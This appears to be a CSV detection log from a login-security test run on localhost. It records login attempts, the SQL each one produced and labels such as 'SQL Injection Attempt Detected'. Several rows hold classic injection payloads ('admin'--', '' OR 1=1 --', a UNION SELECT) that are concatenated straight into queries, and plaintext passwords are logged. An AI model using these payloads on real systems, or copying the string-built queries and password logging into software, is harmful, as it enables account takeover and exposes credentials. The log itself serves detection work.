Timestamp,Username,Query,Attack Detected,Severity,IP Address,User Agent,Login Status
2025-02-18 11:31:27,saikrishna,SELECT * FROM users WHERE username = 'saikrishna' AND password = 'podadei',Failed Login Attempt,,,,
2025-02-18 11:33:42,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = '21232342',SQL Injection Attempt Detected,,,,
2025-02-18 12:00:20,admin'--,SELECT * FROM users WHERE username = 'admin'--' AND password = '21232342',SQL Injection Attempt Detected,High,,,
2025-02-18 12:00:34,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '2587',SQL Injection Attempt Detected,High,,,
2025-02-18 12:06:14,terlibro,SELECT * FROM users WHERE username = 'terlibro' AND password = '3453153',Failed Login Attempt,Medium,,,
2025-02-18 12:06:53,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'hiiiiiii',SQL Injection Attempt Detected,High,,,
2025-02-18 12:10:55,"admin' UNION SELECT 1, 'dummy', 'dummy'--","SELECT * FROM users WHERE username = 'admin' UNION SELECT 1, 'dummy', 'dummy'--' AND password = 'xyzyxzzxyz'",SQL Injection Attempt Detected,High,,,
2025-02-18 18:19:34,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'gowtham123',SQL Injection Attempt Detected,High,,,
2025-02-18 18:29:03,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'dfnenvnbe',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
2025-02-18 18:35:03,' OR 1=1 --,SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'jdcjbdjsncj',SQL Injection Attempt Detected,High,127.0.0.1,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0",
